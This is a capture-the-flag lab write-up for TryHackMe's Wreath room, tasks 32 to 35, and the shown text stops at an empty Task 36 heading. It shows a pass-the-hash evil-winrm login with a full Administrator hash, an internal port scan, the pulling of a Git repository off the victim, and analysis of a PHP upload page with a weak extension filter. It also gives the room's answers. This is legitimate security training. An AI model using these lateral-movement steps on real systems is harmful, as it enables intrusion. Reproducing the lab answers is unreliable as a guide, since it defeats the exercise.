# TryHackMe [Wreath](https://www.tryhackme.com/room/wreath) Tasks 32-43
## References
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 34: Personal PC - The Wonders of Git [YouTube Video]. In YouTube. https://youtu.be/_uH2A5FExyI
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 35: Personal PC - Website Code Analysis [YouTube Video]. In YouTube. https://youtu.be/rowvOkZVsPQ
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 36: Personal PC - Exploit PoC [YouTube Video]. In YouTube. https://youtu.be/EFBbGMW9Kso
## Task 32
```
$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.100.150 -s /home/vagrant/Desktop/Empire/data/module_source/situational_awareness/network

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.100.100 -TopPorts 50
Hostname      : 10.200.100.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 993, 995...}
finishTime    : 4/24/2021 8:12:28 AM
```
## Task 34
```
$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.100.150

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\..\..
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/8/2020   1:28 PM                GitStack
d-----       12/19/2020   5:37 PM                PerfLogs
d-r---         1/3/2021   2:35 PM                Program Files
d-----       12/20/2020   3:56 PM                Program Files (x86)
d-r---       12/20/2020   3:56 PM                Users
d-----        1/13/2021   1:05 PM                Windows


*Evil-WinRM* PS C:\> cd GitStack
*Evil-WinRM* PS C:\GitStack> dir


    Directory: C:\GitStack


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/8/2020   1:28 PM                apache
d-----        11/8/2020   1:28 PM                app
d-----         1/3/2021   3:45 AM                data
d-----        11/8/2020   1:28 PM                git
d-----        11/8/2020   1:28 PM                gitphp
d-----        11/8/2020   1:28 PM                php
d-----        11/8/2020   1:28 PM                python
d-----        11/8/2020   2:35 PM                repositories
d-----        11/8/2020   1:28 PM                templates
-a----        11/8/2020   1:28 PM          66800 uninstall.exe


*Evil-WinRM* PS C:\GitStack> cd repositories
*Evil-WinRM* PS C:\GitStack\repositories> dir


    Directory: C:\GitStack\repositories


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2021   7:05 PM                Website.git


*Evil-WinRM* PS C:\GitStack\repositories> download Website.git
```
```bash
$ cd Website.git 
$ ls
'C:\GitStack\repositories\Website.git'
$ cd C:\\GitStack\\repositories\\Website.git 
$ ls
config  description  HEAD  hooks  info  objects  refs
$ cd ..                                     
$ mv C:\\GitStack\\repositories\\Website.git .git
$ la
.git
$ git clone https://github.com/internetwache/GitTools
Cloning into 'GitTools'...
remote: Enumerating objects: 221, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 221 (delta 2), reused 0 (delta 0), pack-reused 209
Receiving objects: 100% (221/221), 50.18 KiB | 127.00 KiB/s, done.
Resolving deltas: 100% (81/81), done.
$ cd GitTools/Extractor 
$ ./extractor.sh ../../../Website.git ../../../Website             
$ cd ../../../Website  
$ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
=======================================
0-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end
=======================================
1-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit
=======================================
2-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter
=======================================
```
## Task 35
```
$ ls
0-82dfc97bec0d7582d485d9031c09abcb5c6b18f2  1-70dde80cc19ec76704567996738894828f4ee895  2-345ac8b236064b431fa43f53d91c98c4834ef8f3
$ cd 2-345ac8b236064b431fa43f53d91c98c4834ef8f3 
$ ls
commit-meta.txt  css  favicon.png  fonts  img  index.html  js  resources
$ find . -name "*.php" 
./resources/index.php
$ 
```
### What does Thomas have to phone Mrs Walker about?
* `resources/index.php`:
```php
<?php

        if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                $target = "uploads/".basename($_FILES["file"]["name"]);
                $goodExts = ["jpg", "jpeg", "png", "gif"];
                if(file_exists($target)){
                        header("location: ./?msg=Exists");
                        die();
                }
                $size = getimagesize($_FILES["file"]["tmp_name"]);
                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
                        header("location: ./?msg=Fail");
                        die();
                }
                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
                header("location: ./?msg=Success");
                die();
        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
                header("location: ./?msg=Method");
        }


        if(isset($_GET["msg"])){
                $msg = $_GET["msg"];
                switch ($msg) {
                        case "Success":
                                $res = "File uploaded successfully!";
                                break;
                        case "Fail":
                                $res = "Invalid File Type";
                                break;
                        case "Exists":
                                $res = "File already exists";
                                break;
                        case "Method":
                                $res = "No file send";
                                break;

                }
        }
?>
<!DOCTYPE html>
<html lang=en>
        <!-- ToDo:
                  - Finish the styling: it looks awful
                  - Get Ruby more food. Greedy animal is going through it too fast
                  - Upgrade the filter on this page. Can't rely on basic auth for everything
                  - Phone Mrs Walker about the neighbourhood watch meetings
        -->
        <head>
                <title>Ruby Pictures</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
                <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
        </head>
        <body>
                <main>
                        <h1>Welcome Thomas!</h1>
                        <h2>Ruby Image Upload Page</h2>
                        <form method="post" enctype="multipart/form-data">
                                <input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
                                <input type="submit" name="upload" id="fileSubmit" value="Upload">
                        </form>
                        <p id=res><?php if (isset($res)){ echo $res; };?></p>
                </main>
        </body>
</html>
```

**Answer**: `neighbourhood watch meetings`
### Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
**Answer**: `basic auth`
### Which extensions are accepted (comma separated, no spaces or quotes)?
**Answer**: `jpg,jpeg,png,gif`
## Task 36

